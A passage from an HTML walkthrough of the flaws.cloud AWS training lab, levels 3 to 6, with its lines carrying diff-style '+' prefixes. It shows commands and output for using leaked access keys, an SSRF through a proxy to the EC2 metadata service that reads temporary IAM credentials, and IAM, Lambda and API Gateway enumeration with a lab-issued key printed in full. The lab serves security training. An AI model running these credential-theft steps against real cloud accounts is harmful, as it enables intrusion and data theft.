+Timestamp: 2017-09-17 09:10:07 -0600 -0600
+Line: 1
+</code></pre></div>
+<p>Now that we got our hands on a set of <strong>AWS Access Keys</strong> we can import them in our environment using <code>aws configure</code> and see what can be done with them.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ aws configure list --profile level3
+      Name                    Value             Type    Location
+      ----                    -----             ----    --------
+   profile                   level3           manual    --profile
+access_key     ****************T7SA shared-credentials-file    
+secret_key     ****************3Jys shared-credentials-file    
+    region                us-west-2      config-file    ~/.aws/config
+</code></pre></div>
+<p>One of the first commands to run when looting AWS keys is <code>get-caller-identity</code> (AWS's version of <code>whoami</code>).</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ aws sts get-caller-identity --profile level3
+{
+    &quot;UserId&quot;: &quot;AIDAJQ3H5DC3LEG2BKSLC&quot;,
+    &quot;Account&quot;: &quot;975426262029&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:user/backup&quot;
+}
+</code></pre></div>
+<p>Our user is called <code>backup</code>. We can leverage the policies attached to this account to list down all buckets visible by this user.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level3$ aws s3 ls --profile=level3
+2020-06-25 13:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2020-06-26 19:06:07 config-bucket-975426262029
+2020-06-27 06:46:15 flaws-logs
+2020-06-27 06:46:15 flaws.cloud
+2020-06-27 11:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2020-06-27 11:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2020-06-27 11:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2020-06-27 11:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2020-06-27 11:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2020-06-27 22:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+</code></pre></div>
+<p>We don't have read access to everything, but enough to move on to the next level <code>level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</code>.</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Read the following from Github Docs: <a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository#fully-removing-the-data-from-github">Removing sensitive data from a repository</a><br />
+NB: <strong>always</strong> rotate your keys/secrets if you suspect any potential leak.</p>
+</div>
+<p><img alt="" src="/images/aws/training_labs/flaws_1_level4.png" /></p>
+<hr />
+<h2 id="level-4-enumerating-ec2-instance">Level 4 - Enumerating EC2 Instance</h2>
+<blockquote>
+<p>For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud.<br />
+It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. </p>
+</blockquote>
+<hr />
+<h2 id="level-5-ssrf-on-aws-metadata-service">Level 5 - SSRF on AWS Metadata Service</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
+<div class="highlight"><pre><span></span><code>http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
+http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 
+</code></pre></div>
+See if you can use this proxy to figure out how to list the contents of the level6 bucket at <code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code> that has a hidden directory in it. </p>
+</div>
+<p>By leveraging the proxy on the target EC2, we are able to force the server to issue a request to host under our control. This is more-or-less equivalent to a server-side-request-forgery (SSRF) attack.</p>
+<p>SSRFs are known to be particularly impactful in cloud environments due to the presence of the internal metadata service (IMDS) running by default on every compute instance (AWS, GCP, Azure, etc.).</p>
+<p>This service is generally accessible at a fixed IP address <code>169.254.169.254</code>, let's verify that:</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/hostname
+ip-172-31-41-84.us-west-2.compute.internal
+</code></pre></div>
+<p>Most importantly, the IMDS service sometimes allows access to sensitive access keys.</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level5$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
+{
+  &quot;Code&quot; : &quot;Success&quot;,
+  &quot;LastUpdated&quot; : &quot;2022-12-13T07:20:49Z&quot;,
+  &quot;Type&quot; : &quot;AWS-HMAC&quot;,
+  &quot;AccessKeyId&quot; : &quot;ASIA**************XQ&quot;,
+  &quot;SecretAccessKey&quot; : &quot;gH5H********************************rjmy&quot;,
+  &quot;Token&quot; : &quot;IQoJ*****************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************4tuGdtSdxNiGtGsfPrY&quot;,
+  &quot;Expiration&quot; : &quot;2022-12-13T13:22:40Z&quot;
+}
+</code></pre></div>
+<p>We just need to create another profile and import the stolen keys in our environment to see if can do anything with them.</p>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p><a href="https://docs.aws.amazon.com/STS/latest/APIReference/API_Credentials.html">Temporary (AWS STS) access key IDs</a> - as denoted by the <code>ASIA</code> prefix in the <code>AccessKeyId</code> field - require to add an extra field in the <code>aws profile</code> configuration file:
+    <div class="highlight"><pre><span></span><code># cat ~/.aws/credentials
+[level6]
+aws_access_key_id = &lt;AccessKeyId&gt;
+aws_secret_access_key = &lt;SecretAccessKey&gt; 
+aws_session_token = &lt;Token&gt;
+</code></pre></div></p>
+</div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws s3 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ . --profile level6
+fog@cloudbreach:~/flaws/level6$ ll
+total 16
+drwxrwxr-x 3 fog fog 4096 Dec  8 22:10 ./
+drwxrwxr-x 8 fog fog 4096 Dec 13 03:18 ../
+drwxrwxr-x 2 fog fog 4096 Dec  8 22:10 ddcc78ff/
+-rw-rw-r-- 1 fog fog  871 Feb 26  2017 index.html
+</code></pre></div>
+<p><img alt="" src="/images/aws/training_labs/flaws_1_level6.png" /></p>
+<hr />
+<h2 id="level-6-exploiting-aws-lambda-functions">Level 6 - Exploiting AWS Lambda Functions</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>For this final challenge, you're getting a user access key that has the <strong>SecurityAudit</strong> policy attached to it. See what else it can do and what else you might find in this AWS account.</p>
+<div class="highlight"><pre><span></span><code>Access key ID: AKIAJFQ6E7BY57Q3OBGA
+Secret: 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
+</code></pre></div>
+</div>
+<p>Let's enumerate information about our current user. First question we ask ourselves is whether we have any kind of inline policies associated to us:</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws iam list-user-policies --user-name Level6 --profile level6
+{
+    &quot;PolicyNames&quot;: []
+}
+</code></pre></div>
+<p>What about attached policies?</p>
+<p><div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws iam list-attached-user-policies --user-name Level6 --profile level6
+{
+    &quot;AttachedPolicies&quot;: [
+        {
+            &quot;PolicyName&quot;: &quot;MySecurityAudit&quot;,
+            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/MySecurityAudit&quot;
+        },
+        {
+            &quot;PolicyName&quot;: &quot;list_apigateways&quot;,
+            &quot;PolicyArn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;
+        }
+    ]
+}
+</code></pre></div>
+As suggested by the level description, we do have an attached policy called <code>MySecurityAudit</code> but also <code>list_apigateways</code>.</p>
+<p>What can we do with those?</p>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>To retrieve a <strong>managed policy</strong> document that is attached to a user, use <code>GetPolicy</code> to determine the policy's default version. Then use <code>GetPolicyVersion</code> to retrieve the policy document.
+<div class="highlight"><pre><span></span><code>aws iam get_policy --policy-arn &lt;policy_arn&gt;     
+aws iam get_policy_version --policy-arn &lt;policy_arn&gt; --policy-id &lt;policy_version&gt;
+</code></pre></div>
+<a href="https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description">https://docs.aws.amazon.com/cli/latest/reference/iam/get-user-policy.html#description</a></p>
+</div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6
+{
+    &quot;Policy&quot;: {
+        &quot;PolicyName&quot;: &quot;list_apigateways&quot;,
+        &quot;PolicyId&quot;: &quot;ANPAIRLWTQMGKCSPGTAIO&quot;,
+        &quot;Arn&quot;: &quot;arn:aws:iam::975426262029:policy/list_apigateways&quot;,
+        &quot;Path&quot;: &quot;/&quot;,
+        &quot;DefaultVersionId&quot;: &quot;v4&quot;,
+        &quot;AttachmentCount&quot;: 1,
+        &quot;PermissionsBoundaryUsageCount&quot;: 0,
+        &quot;IsAttachable&quot;: true,
+        &quot;Description&quot;: &quot;List apigateways&quot;,
+        &quot;CreateDate&quot;: &quot;2017-02-20T01:45:17Z&quot;,
+        &quot;UpdateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;,
+        &quot;Tags&quot;: []
+    }
+}
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6
+{
+    &quot;PolicyVersion&quot;: {
+        &quot;Document&quot;: {
+            &quot;Version&quot;: &quot;2012-10-17&quot;,
+            &quot;Statement&quot;: [
+                {
+                    &quot;Action&quot;: [
+                        &quot;apigateway:GET&quot;
+                    ],
+                    &quot;Effect&quot;: &quot;Allow&quot;,
+                    &quot;Resource&quot;: &quot;arn:aws:apigateway:us-west-2::/restapis/*&quot;
+                }
+            ]
+        },
+        &quot;VersionId&quot;: &quot;v4&quot;,
+        &quot;IsDefaultVersion&quot;: true,
+        &quot;CreateDate&quot;: &quot;2017-02-20T01:48:17Z&quot;
+    }
+}
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Tip</p>
+<p>Lambda functions are called using a combination of:  </p>
+<ul>
+<li><code>rest-api-id</code> -&gt; e.g: s33ppypa75</li>
+<li><code>stage-name</code>  -&gt; e.g: Prod</li>
+<li><code>region</code>      -&gt; e.g: us-west-2</li>
+<li>and <code>resource</code>-&gt; e.g: level6</li>
+</ul>
+<p>Functions call be triggered by visiting URLs formed as: <code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;resource&gt;</code></p>
+</div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws lambda get-policy --function-name Level6 --profile flaws-level6 --region us-west-2
+{
+    &quot;Policy&quot;: &quot;{\&quot;Version\&quot;:\&quot;2012-10-17\&quot;,\&quot;Id\&quot;:\&quot;default\&quot;,\&quot;Statement\&quot;:[{\&quot;Sid\&quot;:\&quot;904610a93f593b76ad66ed6ed82c0a8b\&quot;,\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Principal\&quot;:{\&quot;Service\&quot;:\&quot;apigateway.amazonaws.com\&quot;},\&quot;Action\&quot;:\&quot;lambda:InvokeFunction\&quot;,\&quot;Resource\&quot;:\&quot;arn:aws:lambda:us-west-2:975426262029:function:Level6\&quot;,\&quot;Condition\&quot;:{\&quot;ArnLike\&quot;:{\&quot;AWS:SourceArn\&quot;:\&quot;arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\&quot;}}}]}&quot;,
+    &quot;RevisionId&quot;: &quot;98033dfd-defa-41a8-b820-1f20add9c77b&quot;
+}
+</code></pre></div>
+<p><div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws/level6$ aws apigateway get-stages --rest-api-id s33ppypa75 --profile level6 --region us-west-2
+{
+    &quot;item&quot;: [
+        {
+            &quot;deploymentId&quot;: &quot;8gppiv&quot;,
+            &quot;stageName&quot;: &quot;Prod&quot;,
+            &quot;cacheClusterEnabled&quot;: false,
+            &quot;cacheClusterStatus&quot;: &quot;NOT_AVAILABLE&quot;,
+            &quot;methodSettings&quot;: {},
+            &quot;tracingEnabled&quot;: false,
+            &quot;createdDate&quot;: 1488155168,
+            &quot;lastUpdatedDate&quot;: 1488155168
+        }
+    ]
+}
+</code></pre></div>
+<a href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a></p>
+<p><img alt="" src="/images/aws/training_labs/flaws_1_levelend.png" /></p>
+<hr />
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../../enumeration/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Enumeration" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Enumeration
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../flaws2/" class="md-footer__link md-footer__link--next" aria-label="Next: Flaws II" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Flaws II
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/0xEval" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/0xEval/0xeval.github.io" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.indexes", "navigation.tracking", "navigation.sections"], "search": "../../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
+      
+    
+    
+  </body>
+</html>
